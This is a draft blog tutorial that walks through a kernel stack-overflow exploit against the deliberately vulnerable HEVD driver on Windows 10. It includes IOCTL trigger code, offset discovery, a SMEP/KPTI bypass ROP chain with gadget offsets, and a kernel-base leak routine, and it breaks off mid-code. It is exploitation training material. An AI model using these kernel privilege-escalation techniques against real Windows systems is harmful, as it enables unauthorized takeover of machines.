@@ -1,0 +1,759 @@
+---
+title: "Cracking HackSys Extreme Vulnerable Driver stack overflow with SMEP and KPTI in Windows 10"
+date: 2022-04-10T13:08:50-03:00
+draft: true
+description: "A beginers guide into a Windows kernel stack overflow vulnerability."
+tags: ["windows", "kernel", "exploit", "stack", "overflow", "hevd", "HEVD", "hacksys", "extreme", "vulnerable", "driver", "exploitation", "smep", "kpti", "bypass"]
+keywords: ["windows", "kernel", "exploit", "stack", "overflow", "hevd", "HEVD", "hacksys", "extreme", "vulnerable", "driver", "exploitation", "smep", "kpti", "bypass"]
+---
+
+## Cracking HackSys Extreme Vulnerable Driver: environment setup and stack overflow
+
+### Some recap: no recap is needed!
+
+Hello! [Previously](https://mdanilor.github.io/posts/hello-kernel/) we exploited [vulnerable linux driver by invictus-0x90](https://github.com/invictus-0x90/vulnerable_linux_driver). If you missed, not to worry: this post is totally unrelated, since we'll be exploiting the vulnerable **Windows** driver [HEVD](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver). However, if you are a curious one, make sure to check the other post! 
+
+### Our target and friends
+Today we'll be attacking HEVD: HackSys Extreme Vulnerable Driver. This Windows driver is intentionally vulnerable to many memory corruption vulnerabilities (stack overflow, int overflow, use after free, type confusion, to name a few). We will exploit stack overflow to gain elevation of privileges in this post.
+
+This exercise is a "must do" if you are starting on Windows kernel exploitation. I would like to thank Payatu and HackSys for developing this extremely useful learning tool.
+
+Many people over the Internet have already solved it and posted writeups (probably way better than mine). However, most writeups I have read lack details on bypassing SMEP and KPTI. This part will be explained in depth here. 
+
+Before we move on, I would like to thank a few friends, as I have not solved challenge by myself. Instead, it was an effort by me and my friends Viniboy, Giuliano and Psylinux through extensive Jitsi calls, a few frustration moments and a lot of joy at the end! Although we had some experience in Windows userland exploitation and Linux kernel exploitation, we did not know anything on Windows kernel exploitation. It has been quite a journey!
+
+Finally, I would also like to send my appreciation to [SiDi](https://sidi.org.br), my employer, for giving us the time and resources to study this topic. 
+
+Now let's get started.
+
+
+### Setting up the environment
+The environment setup is a little tricky. For some reason unknown to me (if you know why this happens, please send me an email), VirtualBox does not have SMEP support (if you don't know what SMEP is, just ignore the last sentence! I will go in depth about SMEP throughout this blog post, but for now just know it is a memory protection). Without SMEP, we miss half the fun. I recommend the latest Hyper-V or VMWare for this, since both support this protection. I will be using Hyper-V in this post.
+
+First, download Windows 10 for Hyper-V or VMWare from [the official Microsoft website](https://developer.microsoft.com/pt-br/microsoft-edge/tools/vms/). You should also have a Windows host. If you don't have a Windows host, you can virtualize it aswell.
+
+The setup we'll organize here is basically this:
+
+```
+┌───────────────────────────┐
+│                           │
+│                           │
+│Windows 10 host (Debugger) │
+│                           │
+│                           │
+└─────────────▲─────────────┘
+              │
+  Attached to debugger on
+              │
+              │
+┌─────────────┴─────────────┐
+│                           │
+│                           │
+│  Windows 10 VM (Debuggee) │
+│                           │
+│                           │
+└───────────────────────────┘
+```
+
+We have a Windows 10 VM (the one we just downloaded) which kernel we will attach to WinDbg debugger on our host. Pretty simple!
+
+Once you have downloaded the Windows VM, start it up on VMWare or Hyper-V. Open `cmd` as administrator and put the following:
+
+```
+bcdedit /debug on
+bcdedit /dbgsettings net hostip:<HOST IP ADDR HERE> port:50000
+```
+
+A key will be given. Copy this key to your host. 
+
+![](kernel2-img/0-bcdedit.png)
+
+We should be able to attach a debugger now using this given key. Download [Windows SDK from the official Microsoft site](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/) to your host. We'll use Microsoft's debugger WinDbg, which comes in this SDK.
+
+Open WinDbg on your host, go to file -> kernel debugging. Leave the port number as 50000 and paste the key you copied from your guest (debuggee). Hit OK and reboot your guest.
+
+![](kernel2-img/1-windbg-kernel-debugging.png)
+
+Once you have rebooted your VM, it should have been attached to the debugger. We will pause the execution to make sure everything is allright. If you are on Hyper-V on advanced mode, it will drop your connection until you restore execution (by pressing F5 on WinDbg).
+
+![](kernel2-img/2-paused.png)
+
+I don't want to install Visual Studio in the debuggee machine, so I will create a shared folder between my host and VM to pass the exploit binary which I'll be building from my host machine. In addition, HEVD will also be sent through this shared folder. The way shared folders are created depend on whether you use VMWare or Hyper-V, so I'll ommit this part here.
+
+Download HEVD to the debuggee machine and load it. This can be done by opening the command prompt as Administrator and executing the following:
+
+```
+sc create HEVD binPath= <Path to HEVD root folder>\driver\vulnerable\x64\HEVD.sys type= kernel
+sc start HEVD
+```
+
+If a debugger is not attached, it will prompt an error on starting the service, as follows:
+
+![](kernel2-img/3-error.png)
+
+If that happens, just attach the debugger and run it again:
+
+![](kernel2-img/4-success.png)
+
+We are almost all set at this to start writing the exploit. But first, let's tune up WinDbg. If you open it vanilla, it will be ugly and will show only the command line. On WinDbg go to view and enable Memory, Call Stack, Disassembly and Memory. Organize it as you wish. Mine looks like this:
+
+![](kernel2-img/5-mywindbg.png)
+
+Finally, we'll enable DbgPrint messages on WinDbg by pausing and inputing the following command:
+
+`ed nt!Kd_IHVDRIVER_Mask 8`
+
+To validate that it works, stop and start HEVD. If you see the debug messages, everything is all set!
+
+![](kernel2-img/6-allset.png)
+
+### Writing a BSOD crash
+
+#### The vulnerable code
+```
+(...)
+    	ULONG KernelBuffer[BUFFER_SIZE] = { 0 };
+(...)
+        // Verify if the buffer resides in user mode
+        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR));
+
+        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
+        DbgPrint("[+] UserBuffer Size: 0x%zX\n", Size);
+        DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
+        DbgPrint("[+] KernelBuffer Size: 0x%zX\n", sizeof(KernelBuffer));
+
+(...)
+
+        DbgPrint("[+] Triggering Buffer Overflow in Stack\n");
+
+        // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
+        // because the developer is passing the user supplied size directly to
+        // RtlCopyMemory()/memcpy() without validating if the size is greater or
+        // equal to the size of KernelBuffer
+
+        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
+(...)
+```
+The comments pretty much explain the whole code. The issue arises on `RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);`, as it copies `Size` bytes, where `Size` is a user-defined length, from a user buffer to a kernel buffer of size `BUFFER_SIZE`. `BUFFER_SIZE` is defined in `Common.h` as 512. ULONG is 4 bytes long, thus `KernelBuffer` size is 2048 bytes. If the user sends a buffer larger than 2048, it will overflow.
+
+If you are new to stack overflow vulnerabilities, you might be asking yourself "but how does a stack overflow can turn into elevation of privileges or arbitrary code execution?". That is a very valid concern and I will not go in depth here, as I have already explained in a previous post. You can read about it [here](https://mdanilor.github.io/posts/hello-kernel/#the-stack). 
+
+#### Let's write some code
+
+Fire up your Visual Studio and create an empty C++ project.
+
+First thing we have to do is find a way to communicate with our device driver. Device drivers can be accessed through Input Output Control (IOCTL), in which a userland application may call for functions implemented by the driver. Each IOCTL function implemented by the driver is assigned to a numeric identificator. Moreover, HEVD implements one IOCTL function for each vulnerability. This means that we have to know which IOCTL function number to "call" and reach the stack overflow vulnerability. For that, we can check the [code](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.h) out:
+
+```
+(...)
+
+#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK                         IOCTL(0x800)
+#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS                      IOCTL(0x801)
+#define HEVD_IOCTL_ARBITRARY_WRITE                               IOCTL(0x802)
+#define HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL                IOCTL(0x803)
+#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL            IOCTL(0x804)
+#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL                 IOCTL(0x805)
+#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL                IOCTL(0x806)
+(...)
+```
+
+As we can see, the buffer overflow stack is IOCTL function number 0x800. 
+
+To use the IOCTL and call the buffer overflow stack function, we must get the handle for the device driver. Windows' CreateFileA function, besides creating new files, opens handles for devices. Check the [doc page](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea?redirectedfrom=MSDN) for further information.
+
+So first let's write a function that gets the handle for the device:
+
+```
+#include <iostream>
+#include <string>
+#include <Windows.h>
+
+#define DEVICE_NAME	"\\\\.\\HackSysExtremeVulnerableDriver"
+#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) // Gets the IOCTL number from the function number
+#define STACK_OVERFLOW_IOCTL_NUMBER     IOCTL(0x800)
+
+using namespace std;
+
+HANDLE get_handle() {
+	HANDLE h = CreateFileA(DEVICE_NAME,
+		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
+		FILE_SHARE_READ | FILE_SHARE_WRITE,
+		NULL,
+		OPEN_EXISTING,
+		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
+		NULL);
+
+	if (h == INVALID_HANDLE_VALUE) {
+		printf("Failed to get handle =(\n");
+		return NULL;
+	}
+	return h;
+}
+```
+
+The `get_handle()` function gets the handle (duh) to the device and returns it, in case of success. It calls CreateFileA function to do that, which parameters are covered below:
+
+* File name - `DEVICE_NAME`: this is the name of the device to get the handle. The device name is `\\.\HackSysExtremeVulnerableDriver`, which is described in the driver source code. These weird extra `\` occur to correctly and safely convert to type `LPCSTR`, accepted by `CreateFileA()` function.
+* Desired access - `FILE_READ_ACCESS | FILE_WRITE_ACCESS`: define which types of access we desire upon manipulating this file. It can be read, write or both, basically. Here we have chosen both.
+* Shared mode - `FILE_SHARE_READ | FILE_SHARE_WRITE`: allows or disallows the file to be opened by other applications. In this case, we do not care too much about this right now. However, in specific scenarios, such as race condition, we might need to get more than one handle to the device.
+* Security Attributes - `NULL`: this optional parameter regards to a few security attributes on the moment of opening the file. It is mostly used to allow handles to be inherited to other processes. In this case, we do not care about that.
+* Creation disposition - `OPEN_EXISTING`: action to take when the desired file does not exist. With `OPEN_EXISTING`, it will raise an error should if the file does not exist. It is usual to use this when working with device drivers.
+* Flags and attributes - `FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL`: as the name states, flags and attributes when opening this file. In this case, we are signaling that the file will be used for asynchronous IO.
+* Template file - `NULL`: ignored when opening an existing file, so NULL here.
+
+We create and use the `IOCTL` macro, which utilizes `CTL_CODE` macro. This macro will not be explained here, but you can read the official documentation [here](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code).
+
+Now we can do IOCTL just by calling `DeviceIoControl()` function. I will create a simple `do_buffer_overflow()` function now that will call the IOCTL sending a 0x1000 byte long buffer that will surely overflow the driver and we'll go on from that.
+
+```
+void do_buffer_overflow(HANDLE h)
+{
+	SIZE_T in_buffer_size = 0x1000;
+	PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size);
+	memset((char *)in_buffer, 'A', in_buffer_size);
+	printf("Sending buffer.\n");
+	bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL);
+	if (!result)
+	{
+		printf("IOCTL Failed: %X\n", GetLastError());
+	}
+	HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer);
+}
+```
+
+What this does is allocate a buffer of size 0x1000 (4096) bytes, which overflows the 2048 byte-long KernelBuffer. Wrapping it up, this is our code:
+
+```
+#include <iostream>
+#include <string>
+#include <Windows.h>
+
+#define DEVICE_NAME	"\\\\.\\HackSysExtremeVulnerableDriver"
+#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
+#define STACK_OVERFLOW_IOCTL_NUMBER     IOCTL(0x800)
+
+using namespace std;
+
+
+HANDLE get_handle() {
+	HANDLE h = CreateFileA(DEVICE_NAME,
+		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
+		FILE_SHARE_READ | FILE_SHARE_WRITE,
+		NULL,
+		OPEN_EXISTING,
+		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
+		NULL);
+
+	if (h == INVALID_HANDLE_VALUE) {
+		printf("Failed to get handle =(\n");
+		return NULL;
+	}
+	return h;
+}
+
+void do_buffer_overflow(HANDLE h)
+{
+	SIZE_T in_buffer_size = 0x1000;
+	PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size);
+	memset((char *)in_buffer, 'A', in_buffer_size);
+	printf("Sending buffer.\n");
+	bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL);
+	if (!result)
+	{
+		printf("IOCTL Failed: %X\n", GetLastError());
+	}
+	HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer);
+}
+
+int main()
+{
+	do_buffer_overflow(get_handle());
+	system("pause");
+}
+```
+
+Now let's put a breakpoint in HEVD function `TriggerBufferOverflowStack()` and run the exploit. Follow the steps below:
+
+* Pause the execution on WinDbg.
+* On the Command window, find the function by typing `x HEVD!TriggerBufferOverflowStack`. Click on the function.
+* Click the link to the source code. The disassembly of the function will open in the Disassembly window.
+![](kernel2-img/7-breakpoint1.png)
+* Navigate your way to the end of the function and put a breakpoint in the RET instruction. (Click the instruction and press F9 to insert a breakpoint)
+![](kernel2-img/8-breakpoint2.png)
+* Resume execution (F5)
+* Run the exploit
+
+The breakpoint hits! Aw yeah!
+
+I use the Memory window to check the stack out by puting `@rsp` in the "Virtual" and everything is 'A'. 
+
+![](kernel2-img/9-as.png)
+
+If we continue, the machine crashes. Mission acomplished. Next step: overwrite the return address.
+
+### Execution flow hijack
+We have already overwritten the return address to `AAAAAAAA`. Cool, but `0x4141414141414141` does not mean any valid address we can execute. We need to find out where exactly in our buffer the return address gets overwritten and replace it with a valid executable address. To which valid executable address we will redirect the execution will come up later on. What we need now is an offset.
+
+There are two ways to determine the offset for the return address. One way is to analyze the assembly code with WinDBG. The other is to use [pattern](https://github.com/ickerwx/pattern). 
+
+#### Offset discovery with WinDBG
+This method is pretty straightforward. If we look at the assembly code of the epilogue of the `hevd!TriggerBufferOverflowStack` function on WinDBG, we get this:
+
+![](kernel2-img/10-functionepilogue.png)
+
+As we can see, it pops 3 64-bit (8 bytes) registers before it calls RET. If we peek at the HEVD source code, we find out the buffer has 2048 bytes. 2048 + 3*8 = 2072 and that is our buffer size.
+
+This method requires some extra manual evaluation and the visual inspection may be prone to human error, so there is a more assertive way shown next.
+
+#### Offset discovery with pattern
+This approach is usually error free. First we use [pattern](https://github.com/ickerwx/pattern) to create a pattern (duh) that will go in the buffer. 
+
+`pattern.py create 2100` will generate a 2100 byte long pattern to our buffer. It should look like this:
+
+![](kernel2-img/11-patterncreate.png)
+
+These weird characters will be used to find out the offset. We will send this pattern in our buffer and use the same tool to find out which offset of the pattern reached to the instruction pointer.
+
+The code gets like this:
+
+```
+void do_buffer_overflow(HANDLE h)
+{
+	SIZE_T in_buffer_size = 2100;
+	PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size);
+	in_buffer = (PULONG) "<GENERATED_PATTERN_HERE>"
+	
+	printf("Sending buffer.\n");
+	bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL);
+	if (!result)
+	{
+		printf("IOCTL Failed: %X\n", GetLastError());
+	}
+	HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer);
+}
+```
+
+Now set up a breakpoint in `hevd!TriggerBufferOverflowStack`'s `ret` instruction and let us see the results.
+
+As soon as the breakpoint hits, which is just before the `ret` instruction executes, we peek at the memory (make sure to set up display format as ASCII) and check the top of the stack out:
+
+![](kernel2-img/12-patterninstack.png)
+
+In my case, I have `0Cr1` at the top of my stack. So I'll run [pattern](https://github.com/ickerwx/pattern): `pattern.py offset 0Cr1 2100`, where `0Cr1` is the pattern for which I want the offset and 2100 is the size of the generated buffer. And the result is 2072:
+
+![](kernel2-img/13-patteroffset.png)
+
+That way, we must put the return address in the position 2072 of our payload. This will redirect the execution flow to whatever address we put in this position. But this raises the next question: where do we redirect the execution flow to?
+
+### Where to redirect the execution flow?
+The first naive approach that would come to mind is to create a userland function in our exploit and redirect the control flow to that function. This approach was fine until Windows 7 SP1 launched (I believe it was on Windows 7 SPI, but I might be mistaken on this one. Could not find sources on the Internet to back this up). However, from this point onwards Supervisor Mode Execution Prevention was enabled in processor which has support for it. 
+
+#### WTF is Supervisor Mode Execition Prevention?
+Ok, but first what is supervisor mode anyways?
+
+[Supervisor mode](https://en.wikipedia.org/wiki/Protection_ring#SUPERVISOR-MODE) is an execution mode which enables all instructions, including privileged ones. It gives access to different address spaces, memory management hardware and other peripherals. This is the mode in which the kernel, and its drivers, run. It is basically a "god mode" in which the kernel runs, but not userland programs.
+
+So the Supervisor Mode Execution Prevention is a mitigation that will not permit certain regions of memory (such as userland memory) to be executed in supervisor mode. In terms of our exploit, if we redirect the execution flow to our program in userland, it will raise a trap and you will immediately get a BSOD.
+
+This mitigation can be disabled (almost trivially on Windows, if I might say so) by setting the 20th bit of CR4 register to zero. This can be achieved in kernel land with a ROP chain. In this case, we can bypass SMEP by using a ROP chain, for instance.
+
+We can also bypass SMEP by never going to userland in the first place. We can use ROP gadgets in the kernel to perform elevation of privileges or write our shellcode to a memory region in the kernel which is both executable and writable. This approach is usually harder than the former. 
+
+In this case, we should go with the easier approach and ROP our way to disable the SMEP bit on the CR4 register, right?
+
+Well, we could try. But nowadays there is another mitigation in place that will make this bypass useless.
+
+#### SMEP was our only hope. No, there is another.
+![](kernel2-img/14-yoda.webp)
+There is another mitigation called Kernel Page-Table Isolation (KPTI), or, as Windows calls it, Kernel Virtual Address (KVA) Shadow. It was actually created to mitigate Meltdown vulnerabilities by isolating kernel page tables from user page tables. However, it also creates another problem: when executing kernel code, it marks user page tables as non-executable (NX). This breaks down our easy approach to just disable SMEP by ropping.
+
+Now we can either mark user pages as executable again or use a writable and executable kernel page to store our shellcode. The latter approach will be used here.
+
+With this approach, we don't have to be concerned about SMEP at all, as we will just avoid it. But this raises yet another question: is there such a place in kernel where we can write our shellcode and execute it?
+
+#### Allocating an executable pool
+Driver developers can allocate different types of memory pools. The two most basic types are PagedPool and NonPagedPool types. The former allocated a non-executable pageable memory pool for use, whereas the latter allocates non-pageable pool which, by default, is executable. The allocation can be performed by calling [ExAllocatePoolWithTag()](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exallocatepoolwithtag) function with the desired parameters. 
+
+We shall use this function to allocate an executable NonPagedPool. Then we write our shellcode to this allocated region and execute it. Finally, we restore enough registers so the system can return to userland gracefully and that's a wrap. 
+
+The `ExAllocatePoolWithTag()` has the following prototype:
+
+```
+PVOID ExAllocatePoolWithTag(
+  [in] __drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,
+  [in] SIZE_T                                         NumberOfBytes,
+  [in] ULONG                                          Tag
+);
+```
+
+The first parameter is the pool type, which is zero (NonPagedPool), as can be checked in the [official Microsoft documentation](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ne-wdm-_pool_type). The second parameter is the size, which we can just use 4096 bytes. Finally, the Tag parameter is just for debugging purposes. We can put whatever we want in it.
+
+It will return the address of the allocated pool. 
+
+According to [Microsoft documentation](https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170), the call convention dictates that the first parameter is given in `rcx` register, the second in `rdx` and the third in `r8`. We shall ROP our way to set up `rcx` to zero, `rdx` to 4096 and call this function. The address allocated will be returned in `rax` register, as it is also dictated by the call convention.
+
+After it is allocated, we can use `RtlCopyMemory` to copy our shellcode from userland to the executable address in the kernel land. Finally, we can use some gadget, such as `jmp rax` to redirect the execution flow. 
+
+Once again, this approach raises another problem. We must have the address of `ExAllocatePoolWithTag` and `RtlCopyMemory` (or an analogue memory copy function) to know where to redirect our flow. We could get the address for these functions on the ntoskrnl.exe (which is actually the kernel program), but the imagebase is changed upon each reboot. This means that on every reboot, every kernel function will be added to an offset, the imagebase offset, making the addresses unpredictable. Our approach will rely on getting the addresses for the desired functions (and eventual gadgets) in the ntoskrnl.exe binary and somehow leak the imagebase address to defeat the protection.
+
+#### Defeating the randomized imagebase
+This sounds like a really hard problem to solve that would rely on leaking a kernel address and then try to guess the imagebase with that. And this problem is usually hard to solve. But Windows makes it easier for us!
+
+For processes running with medium integrity level (which is the default level when you open applications), there are Windows APIs which will give that away for free. Microsoft even gives us [an example](https://docs.microsoft.com/en-us/windows/win32/psapi/enumerating-all-device-drivers-in-the-system) of how to implement this. 
+
+The `EnumDeviceDrivers` function, present on `psapi.h`, will enumerate all device drivers, including the kernel itself, and give us the base address for the device driver. It will return a list of device drivers, the first of which being the kernel itself. The implementation is very simple:
+
+```
+#include <Windows.h>
+#include <Psapi.h>
+...
+unsigned long long get_kernel_base_addr() {
+	LPVOID drivers[1024];
+	DWORD cbNeeded;
+
+	EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
+
+	return (unsigned long long)drivers[0];
+}
+
+```
+
+There we go! The randomized imagebase is now defeated. 
+
+It is also useful to be able to get any kernel function address by the function name. This is done by opening the kernel binary as a library and looking up the address for the desired symbol. The implementation is very straightforward as well:
+
+```
+PVOID get_kernel_symbol_addr(const char *symbol) {
+	PVOID kernelBaseAddr;
+	HMODULE userKernelHandle;
+	PCHAR functionAddress;
+	unsigned long long offset;
+
+	kernelBaseAddr = (PVOID)get_kernel_base_addr();  // Get base address from our previously implemented function
+	userKernelHandle = LoadLibraryA("C:\\Windows\\System32\\ntoskrnl.exe");  // Loads the kernel binary as a lib
+
+	if (userKernelHandle == INVALID_HANDLE_VALUE) {
+		// Something went wrong
+		return NULL;
+	}
+
+	functionAddress = (PCHAR)GetProcAddress(userKernelHandle, symbol);  // Finds the address of the specified symbol
+	if (functionAddress == NULL) {
+		// Something went wrong
+		return NULL;
+	}
+
+	offset = functionAddress - ((PCHAR)userKernelHandle);  // Subtracts the address found for the symbol to the base address of the lib loaded in the process memory
+	return (PVOID)(((PCHAR)kernelBaseAddr) + offset);  // Adds the offset of the leaked kernel base address
+}
+```
+
+With the function above, we can query the address of any kernel function. Neat!
+
+#### When are we building the payload here?
+Patience! Thus far we have seen the basics to correctly assemble a usable payload. Now that we have all the tools necessary, let's finally create our payload. May the force be with us.
+
+Our ROP chain should look something like this:
+
+`xor ecx, ecx; ret`: zeroes out our RCX register, which is the first parameter of AllocatePoolWithTag()
+
+`pop rdx; ret`: pops 0x1000 (4096) to rdx register, which is the second parameter of AllocatePoolWithTag() and indicates the size of the pool
+
+`0x1000`: value of rdx
+
+`AllocatePoolWithTag()`: calls the AllocatePoolWithTag function. The address of the allocated pool will then be in rax
+
+`mov rcx, rax; ret`: copies the address to rcx, which will be first parameter of memcpy
+
+`pop rdx; ret`: gets the source address from stack. This will be our shellcode in userland that will escalate privileges.
+
+`address of shellcode location in userland`
+
+`pop r8; ret`: gets the size from stack.
+
+`size of our shellcode to be copied`
+
+`memcpy()`: calls the memcpy function and copies our payload to an executable kernel space
+
+`jmp rcx`: jumps to a register which stores the address of our shellcode in kernel land
+
+
+That sounds pretty complicated and will probably not work like that. We will most likely have to make a few adaptations. However, the plan is simple: allocate a writable and executable location in kernel land, copy our payload to it and then jump there. We need to find gadgets to do what we want. And for that, we shall use [ropper](https://github.com/sashs/Ropper). This tool will assist us in our ROP journey by helping us to find the gadgets.
+
+We may copy ntoskrnl.exe to a machine in which ropper is installed and then look for gadgets!
+
+
+With ropper we get:
+
+```
+0x38cf53: xor ecx, ecx; mov rax, rcx; ret;
+0x416748: pop rdx; ret;
+0x1000
+AllocatePoolWithTag();
+0x20a263: push rax; pop rbx; ret; //Saving the address in rbx for later use
+0x5af724: push rax; pop r13; ret;
+0x2c0da6: xchg r8, r13; ret; 
+0x93ac7a: mov rcx, r8; mov rax, rcx; ret;
+0x416748: pop rdx; ret;
+<ADDRESS OF SHELLCODE>
+0x2017f1: pop r8; ret;
+<SIZE OF SHELLCODE>
+memcpy();
+0x408aa2: jmp rbx;
+```
+
+What a mess! 
+This looks far from the payload we predicted. It's messy and big. This happened because it is hard to find gadgets that fit exactly to our needs. We often have to compromise and accept some collateral damage.
+
+There is one more catch. Check ExAllocatePoolWithTag's prologue:
+![](kernel2-img/16-allocate.png)
+
+As we can see, it uses [fast call procedure with shadow space](https://retroscience.net/x64-assembly.html#fast-call-procedure-shadow-space-home-space), AKA home space. In this convention, the caller must resere 32 bytes on stack for the callee. For ExAllocatePoolWithTag, only 24 bytes are needed. This means that after AllocatePoolWithTag we must make sure to add 0x18 to rsp. I found an `add rsp, 0x20` that will do just fine. I place it after AllocatePoolWithTag.
+
+Here is what we have so far:
+
+```
+#include <iostream>
+#include <string>
+#include <Windows.h>
+#include <Psapi.h>
+
+#define DEVICE_NAME	"\\\\.\\HackSysExtremeVulnerableDriver"
+#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
+
+
+//Gadgets
+unsigned long long g_add_rsp_20h_ret = 0xa155de;
+
+unsigned long long g_pop_rdi_pop_r14_pop_rbx_ret = 0x20a518;
+unsigned long long g_xor_ecx_ecx_mov_rax_rcx_ret = 0x38cf53;
+unsigned long long g_pop_rdx_ret = 0x416748;
+unsigned long long g_push_rax_pop_rbx_ret = 0x20a263;
+unsigned long long g_push_rax_pop_r13_ret = 0x5af724;
+unsigned long long g_xchg_r8_r13_ret = 0x2c0da6;
+unsigned long long g_mov_rcx_r8_mov_rax_rcx_ret = 0x93ac7a;
+unsigned long long g_pop_r8_ret = 0x2017f1;
+unsigned long long g_jmp_rbx = 0x408aa2;
+unsigned long long kernel_ExAllocatePoolWithTag;
+unsigned long long kernel_sysret = 0xa13dc0;
+unsigned long long kernel_memcpy;
+
+// This will store the pid for the process which privileges will be elevated
+DWORD pid;
+
+typedef NTSTATUS(*_PsLookupProcessByProcessId)(IN HANDLE, OUT PVOID *);
+_PsLookupProcessByProcessId kernel_PsLookupProcessByProcessId;
+
+typedef PVOID(*_PsReferencePrimaryToken)(PVOID);
+_PsReferencePrimaryToken kernel_PsReferencePrimaryToken;
+
+//IoCTL number
+#define STACK_OVERFLOW_IOCTL_NUMBER     IOCTL(0x800)
+
+
+// Gets kernel base addr
+unsigned long long get_kernel_base_addr() {
+	LPVOID drivers[1024];
+	DWORD cbNeeded;
+
+	EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
+
+	return (unsigned long long)drivers[0];
+}
+
+// Gets handle to driver
+HANDLE get_handle() {
+	HANDLE h = CreateFileA(DEVICE_NAME,
+		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
+		FILE_SHARE_READ | FILE_SHARE_WRITE,
+		NULL,
+		OPEN_EXISTING,
+		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
+		NULL);
+
+	if (h == INVALID_HANDLE_VALUE) {
+		printf("Failed to get handle =(\n");
+		return NULL;
+	}
+	return h;
+}
+
+//Helper function to add gadget or address to payload and increment the offset automatically
+void add_to_payload(char *in_buffer, SIZE_T *offset, unsigned long long *data, SIZE_T size)
+{
+	memcpy(in_buffer + *offset, data, size);
+	printf("Wrote %lx to offset %u\n", *data, *offset);
+	*offset += size;
+}
+
+//Looks up a kernel symbol
+PVOID get_kernel_symbol_addr(const char *symbol) {
+	PVOID kernelBaseAddr;
+	HMODULE userKernelHandle;
+	PCHAR functionAddress;
+	unsigned long long offset;
+
+	kernelBaseAddr = (PVOID)get_kernel_base_addr();  // Loaded kernel base address
+	userKernelHandle = LoadLibraryA("C:\\Windows\\System32\\ntoskrnl.exe");  // Opens kernel binary as lib
+
+	if (userKernelHandle == INVALID_HANDLE_VALUE) {
+		return NULL;
+	}
+
+	functionAddress = (PCHAR)GetProcAddress(userKernelHandle, symbol);  // Locates the symbol address
+	if (functionAddress == NULL) {
+		return NULL;
+	}
+
+	offset = functionAddress - ((PCHAR)userKernelHandle);  // Subtracts the library base address in memory from the function addresses.
+	return (PVOID)(((PCHAR)kernelBaseAddr) + offset);  // Adds the offset to the leaked kernel base address
+}
+
+// Auxiliary function to adjust the offsets for all the gadgets and used functions
+void adjust_offsets()
+{
+	unsigned long long kernel_base_addr = get_kernel_base_addr();
+	g_xor_ecx_ecx_mov_rax_rcx_ret += kernel_base_addr;
+	g_pop_rdi_pop_r14_pop_rbx_ret += kernel_base_addr;
+	g_add_rsp_20h_ret += kernel_base_addr;
+	g_pop_rdx_ret += kernel_base_addr;
+	g_push_rax_pop_rbx_ret += kernel_base_addr;
+	g_push_rax_pop_r13_ret += kernel_base_addr;
+	g_xchg_r8_r13_ret += kernel_base_addr;
+	g_mov_rcx_r8_mov_rax_rcx_ret += kernel_base_addr;
+	g_pop_r8_ret += kernel_base_addr;
+	g_jmp_rbx += kernel_base_addr;
+	
+	kernel_sysret += kernel_base_addr;
+	kernel_ExAllocatePoolWithTag = (unsigned long long) get_kernel_symbol_addr("ExAllocatePoolWithTag");
+	kernel_memcpy = (unsigned long long) get_kernel_symbol_addr("memcpy");
+	kernel_PsLookupProcessByProcessId = (_PsLookupProcessByProcessId) get_kernel_symbol_addr("PsLookupProcessByProcessId");
+	kernel_PsReferencePrimaryToken = (_PsReferencePrimaryToken) get_kernel_symbol_addr("PsReferencePrimaryToken");
